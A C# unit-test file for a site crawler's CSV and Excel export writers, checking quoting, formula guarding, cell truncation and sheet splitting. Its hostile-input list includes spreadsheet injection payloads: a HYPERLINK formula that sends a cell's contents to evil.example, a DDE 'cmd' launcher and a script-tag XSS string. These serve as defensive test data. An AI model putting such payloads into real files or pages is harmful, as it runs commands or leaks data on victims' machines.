using System.IO.Compression;
using System.Text;
using ShoutingIguana.Engine.Export;
using ShoutingIguana.Engine.Export.Models;
using ShoutingIguana.Engine.Export.Tables;
using ShoutingIguana.Engine.Export.Xlsx;
using ShoutingIguana.Engine.Export.Xlsx.Models;
using ShoutingIguana.Engine.Tests.Support;

namespace ShoutingIguana.Engine.Tests.Export;

/// <summary>
/// The two files an export writes, cell by cell: CSV as RFC 4180 and Excel read it, and a workbook that is valid against
/// the format's schema and reads back as what was written. Every text here is what a crawled site can send: formulas,
/// quotes, commas, line breaks, control characters, emoji, and text shaped like the format's own escapes.
/// </summary>
public sealed class TableWriterTests : IDisposable
{
    /// <summary>Text a site can put in a title, an anchor or a URL, none of which may be run, lost or changed.</summary>
    public static readonly string[] HOSTILE =
    [
        "=HYPERLINK(\"https://evil.example/?\"&A1,\"Click\")",
        "=cmd|' /C calc'!A0",
        "+44 20 7946 0000",
        "-1+1",
        "@SUM(A1:A9)",
        "\t=1+1",
        "\r=1+1",
        "plain, with a comma",
        "she said \"hello\"",
        "\"quoted from the start\"",
        "two\nlines",
        "windows\r\nlines",
        "tab\tinside",
        "bell\u0007 and escape\u001B and null\0 inside",
        "emoji 🦎 and 日本語 and ñ",
        "lone surrogate \uD83E end",
        "_x0041_ is not an A",
        "ends with a quote\"",
        "  spaces around  ",
        "<script>alert(1)</script> & </t></si>",
        "'already apostrophed",
        "https://example.com/a?b=1,2&c=\"d\"",
        "-"
    ];

    private readonly string _folder = Directory.CreateTempSubdirectory("si-export-").FullName;

    public void Dispose() => Directory.Delete(_folder, recursive: true);

    [Fact]
    public void CsvIsUtf8WithAByteOrderMarkAndCrlfRows()
    {
        var path = WriteCsv(["Name", "Count"], [["a", 1L], ["b", 2L]]);
        Assert.Equal([0xEF, 0xBB, 0xBF, .. "Name,Count\r\na,1\r\nb,2\r\n"u8.ToArray()], File.ReadAllBytes(path));
    }

    [Fact]
    public void CsvQuotesWhatRfc4180SaysToQuoteAndDoublesQuotes()
    {
        var path = WriteCsv(["Title"], [["a,b"], ["say \"hi\""], ["two\nlines"], ["cr\rinside"], ["plain"]]);
        var text = Encoding.UTF8.GetString(File.ReadAllBytes(path).AsSpan(3));
        Assert.Equal("Title\r\n\"a,b\"\r\n\"say \"\"hi\"\"\"\r\n\"two\nlines\"\r\n\"cr\rinside\"\r\nplain\r\n", text);
    }

    [Theory]
    [InlineData("=1+1", "'=1+1")]
    [InlineData("+44 20 7946 0000", "'+44 20 7946 0000")]
    [InlineData("-1+1", "'-1+1")]
    [InlineData("@SUM(A1)", "'@SUM(A1)")]
    [InlineData("\t=1+1", "'\t=1+1")]
    [InlineData("\r=1+1", "'\r=1+1")]
    [InlineData("=HYPERLINK(\"https://evil.example\",\"x\")", "'=HYPERLINK(\"https://evil.example\",\"x\")")]
    [InlineData("a=1", "a=1")]
    [InlineData(" =1+1", " =1+1")]
    [InlineData("", "")]
    public void ACsvFieldThatWouldBeAFormulaIsWrittenAsText(string title, string written)
    {
        var rows = CsvFile.Read(WriteCsv(["Title"], [[title]]));
        Assert.Equal(written, rows[1][0]);
    }

    /// <summary>A negative number in a numeric column is a number, not text guarded with an apostrophe.</summary>
    [Fact]
    public void ACsvNumberIsWrittenAsItsDigitsNegativeOrNot()
    {
        var path = WriteCsv(["Depth", "Share", "Text"], [[-5L, -0.25, "-5"], [12L, 1e21, null]]);
        var text = Encoding.UTF8.GetString(File.ReadAllBytes(path).AsSpan(3));
        Assert.Equal("Depth,Share,Text\r\n-5,-0.25,'-5\r\n12,1E+21,\r\n", text);
    }

    [Fact]
    public void EveryHostileTextReadsBackFromCsvAsItWasWithItsGuard()
    {
        var rows = CsvFile.Read(WriteCsv(["Title", "After"], [.. HOSTILE.Select(text => new object?[] { text, "after" })]));
        Assert.Equal(HOSTILE.Length + 1, rows.Count);
        for (var index = 0; index < HOSTILE.Length; index++)
        {
            // A lone surrogate can't be written as UTF-8: it becomes U+FFFD, as any encoder writes it.
            var expected = HOSTILE[index].Replace('\uD83E'.ToString() + " ", "\uFFFD ", StringComparison.Ordinal);
            var guarded = expected.Length > 0 && "=+-@\t\r".Contains(expected[0], StringComparison.Ordinal) ? "'" + expected : expected;
            Assert.Equal(guarded, rows[index + 1][0]);
            Assert.Equal("after", rows[index + 1][1]);
        }
    }

    [Fact]
    public void AWorkbookIsValidAndReadsBackAsWritten()
    {
        var path = WriteXlsx("URLs", ["URL", "Status", "Response time (ms)", "Indexable"],
        [
            ["https://example.com/", 200L, 153L, "Yes"],
            ["https://example.com/gone", 404L, null, "No"],
            ["https://example.com/half", null, 0.5, null]
        ]);

        var sheet = Assert.Single(XlsxFile.Read(path).Sheets);
        Assert.Equal("URLs", sheet.Name);
        Assert.Equal(1, sheet.FrozenRows);
        Assert.Equal("A1:D4", sheet.Filter);
        Assert.Equal(4, sheet.Widths.Count);
        Assert.Equal(
        [
            ["URL", "Status", "Response time (ms)", "Indexable"],
            ["https://example.com/", 200d, 153d, "Yes"],
            ["https://example.com/gone", 404d, null, "No"],
            ["https://example.com/half", null, 0.5, null]
        ], sheet.Values);

        // The header is bold; numbers are numbers, not text.
        Assert.All(sheet.Rows[0], cell => Assert.Equal((uint)XlsxStyle.Bold, cell.Style));
        Assert.False(sheet.Rows[1][1].IsText);
        Assert.True(sheet.Rows[1][0].IsText);
    }

    /// <summary>
    /// A workbook's text cell is text whatever it holds, so nothing is run; one that looks like a formula is also marked
    /// as Excel marks text typed with a leading apostrophe, so that editing the cell doesn't turn it into one.
    /// </summary>
    [Fact]
    public void EveryHostileTextReadsBackFromAWorkbookUnchangedAndAsText()
    {
        var path = WriteXlsx("Titles", ["Title", "After"], [.. HOSTILE.Select(text => new object?[] { text, 7L })]);
        var sheet = Assert.Single(XlsxFile.Read(path).Sheets);
        for (var index = 0; index < HOSTILE.Length; index++)
        {
            var cell = sheet.Rows[index + 1][0];
            Assert.True(cell.IsText, $"'{HOSTILE[index]}' wasn't written as text.");
            Assert.Equal(HOSTILE[index].Replace('\uD83E'.ToString() + " ", "\uFFFD ", StringComparison.Ordinal), cell.Value);
            var looksLikeFormula = "=+-@\t\r".Contains(HOSTILE[index][0], StringComparison.Ordinal);
            Assert.Equal(looksLikeFormula ? (uint)XlsxStyle.QuotedText : 0u, cell.Style);
            Assert.Equal(7d, sheet.Rows[index + 1][1].Value);
        }
    }

    [Fact]
    public void ACellLongerThanExcelHoldsIsCutAndCounted()
    {
        var path = Path.Combine(_folder, "long.xlsx");
        long truncated;
        using (var output = File.Create(path))
        using (var strings = new MemoryStream())
        using (var table = new XlsxTableWriter(new XlsxWriter(output, strings), 16))
        {
            table.Begin("Long", ["Text"]);
            table.WriteRow([new string('a', 40_000)]);
            table.WriteRow([new string('b', 32_766) + "🦎"]);
            table.WriteRow([new string('c', 32_767)]);
            table.End();
            table.Complete();
            truncated = table.TruncatedCells;
        }

        var sheet = Assert.Single(XlsxFile.Read(path).Sheets);
        Assert.Equal(2, truncated);
        Assert.Equal(new string('a', 32_767), sheet.Rows[1][0].Value);

        // Never half an emoji.
        Assert.Equal(new string('b', 32_766), sheet.Rows[2][0].Value);
        Assert.Equal(new string('c', 32_767), sheet.Rows[3][0].Value);
    }

    /// <summary>
    /// Excel reads at most 32,758 characters of a CSV field as one cell: at the 32,759th it ends the row and starts
    /// another with what is left, in column A, where nothing guards it, so a formula at the end of a site's long URL
    /// would run. A longer text is cut to what Excel reads whole, its guard's apostrophe counted in, never between the
    /// halves of an emoji, and the cut is counted as a workbook's is. The quotes CSV doubles are the file's, not the cell's.
    /// </summary>
    [Fact]
    public void ACsvFieldLongerThanExcelReadsAsOneCellIsCutAndCounted()
    {
        var path = Path.Combine(_folder, "long.csv");
        long truncated;
        using (var output = File.Create(path))
        using (var table = new CsvTableWriter(output))
        {
            table.Begin("Long", ["Text", "After"]);
            table.WriteRow([new string('a', 32_758), "kept whole"]);
            table.WriteRow([new string('b', 32_755) + "=1+1", "one over"]);
            table.WriteRow([new string('c', 40_000) + "=1+1", "far over"]);
            table.WriteRow(["=" + new string('d', 32_758), "guarded"]);
            table.WriteRow([new string('e', 32_757) + "🦎", "half an emoji"]);
            table.WriteRow(["\"" + new string('f', 32_757) + ",\"", "quoted"]);
            table.WriteRow(["\"" + new string('g', 32_756) + "\"", "quoted and whole"]);
            table.End();
            table.Complete();
            truncated = table.TruncatedCells;
        }

        var rows = CsvFile.Read(path);
        Assert.Equal(8, rows.Count);
        Assert.All(rows, row => Assert.Equal(2, row.Length));
        Assert.Equal(["After", "kept whole", "one over", "far over", "guarded", "half an emoji", "quoted", "quoted and whole"], rows.Select(row => row[1]));
        Assert.All(rows, row => Assert.True(row[0].Length <= 32_758, $"{row[1]}: {row[0].Length} characters."));
        Assert.Equal(new string('a', 32_758), rows[1][0]);
        Assert.Equal(new string('b', 32_755) + "=1+", rows[2][0]);
        Assert.Equal(new string('c', 32_758), rows[3][0]);
        Assert.Equal("'=" + new string('d', 32_756), rows[4][0]);
        Assert.Equal(new string('e', 32_757), rows[5][0]);
        Assert.Equal("\"" + new string('f', 32_757), rows[6][0]);
        Assert.Equal("\"" + new string('g', 32_756) + "\"", rows[7][0]);
        Assert.Equal(5, truncated);
    }

    [Fact]
    public void ATableLongerThanASheetGoesOnToTheNextUnderTheSameHeader()
    {
        var path = Path.Combine(_folder, "rows.xlsx");
        const int ROWS = XlsxWriter.MAX_ROWS + 10;
        int sheets;
        using (var output = File.Create(path))
        using (var strings = new MemoryStream())
        using (var table = new XlsxTableWriter(new XlsxWriter(output, strings, CompressionLevel.Fastest), 16))
        {
            table.Begin("Links", ["Crawl order"]);
            var row = new object?[1];
            for (var index = 1; index <= ROWS; index++)
            {
                row[0] = (long)index;
                table.WriteRow(row);
            }

            table.End();
            table.Complete();
            sheets = table.Sheets;
        }

        Assert.Equal(2, sheets);
        var file = XlsxFile.Scan(path);
        Assert.Equal(["Links", "Links (2)"], file.Select(sheet => sheet.Name));

        // The header is a text (the first shared string), then the rows' numbers.
        var first = file[0].FirstCells;
        Assert.Equal(XlsxWriter.MAX_ROWS, first.Count);
        Assert.Equal(["0", "1", "2"], first.Take(3));
        Assert.Equal((XlsxWriter.MAX_ROWS - 1).ToString(System.Globalization.CultureInfo.InvariantCulture), first[^1]);

        // The second sheet starts under the header again, with the row after the first sheet's last.
        var second = file[1].FirstCells;
        Assert.Equal(12, second.Count);
        Assert.Equal("0", second[0]);
        Assert.Equal(XlsxWriter.MAX_ROWS.ToString(System.Globalization.CultureInfo.InvariantCulture), second[1]);
        Assert.Equal(ROWS.ToString(System.Globalization.CultureInfo.InvariantCulture), second[^1]);
    }

    [Fact]
    public void ATablePastTheSheetsItIsAllowedStopsTheExport()
    {
        var path = Path.Combine(_folder, "capped.xlsx");
        using var output = File.Create(path);
        using var strings = new MemoryStream();
        using var table = new XlsxTableWriter(new XlsxWriter(output, strings, CompressionLevel.Fastest), 1);
        table.Begin("Links", ["Crawl order"]);
        var row = new object?[] { 1L };
        var failure = Assert.Throws<ExportException>(() =>
        {
            for (var index = 0; index <= XlsxWriter.MAX_ROWS; index++)
            {
                table.WriteRow(row);
            }
        });
        Assert.Equal(ExportFailure.TooLarge, failure.Failure);
        Assert.Contains("CSV", failure.Message, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("3 Large images that slow pages down", "3 Large images that slow pages…")]
    [InlineData("Title: too/long [really]?*", "Title  too long  really")]
    [InlineData("'quoted'", "quoted")]
    [InlineData("", "Sheet")]
    [InlineData("History", "History_")]
    [InlineData("Summary", "Summary (2)")]
    [InlineData("summary", "summary (2)")]
    [InlineData("12 Pages that name another page as the main version", "12 Pages that name another pag…")]
    public void ASheetsNameIsOneExcelTakes(string wanted, string name)
    {
        Assert.Equal(name, XlsxWriter.SheetName(wanted, ["Summary"]));
        Assert.True(name.Length <= XlsxWriter.MAX_SHEET_NAME);
    }

    [Fact]
    public void AWorkbookWithNoSheetStillOpens()
    {
        var path = Path.Combine(_folder, "empty.xlsx");
        using (var output = File.Create(path))
        using (var strings = new MemoryStream())
        using (var workbook = new XlsxWriter(output, strings))
        {
            workbook.Complete();
        }

        Assert.Empty(Assert.Single(XlsxFile.Read(path).Sheets).Rows);
    }

    private string WriteCsv(string[] titles, object?[][] rows)
    {
        var path = Path.Combine(_folder, $"{Guid.NewGuid():N}.csv");
        using var output = File.Create(path);
        using var table = new CsvTableWriter(output);
        Write(table, "Table", titles, rows);
        return path;
    }

    private string WriteXlsx(string name, string[] titles, object?[][] rows)
    {
        var path = Path.Combine(_folder, $"{Guid.NewGuid():N}.xlsx");
        using var output = File.Create(path);
        using var strings = new MemoryStream();
        using var table = new XlsxTableWriter(new XlsxWriter(output, strings), 16);
        Write(table, name, titles, rows);
        return path;
    }

    private static void Write(ITableWriter table, string name, string[] titles, object?[][] rows)
    {
        table.Begin(name, titles);
        foreach (var row in rows)
        {
            table.WriteRow(row);
        }

        table.End();
        table.Complete();
    }
}
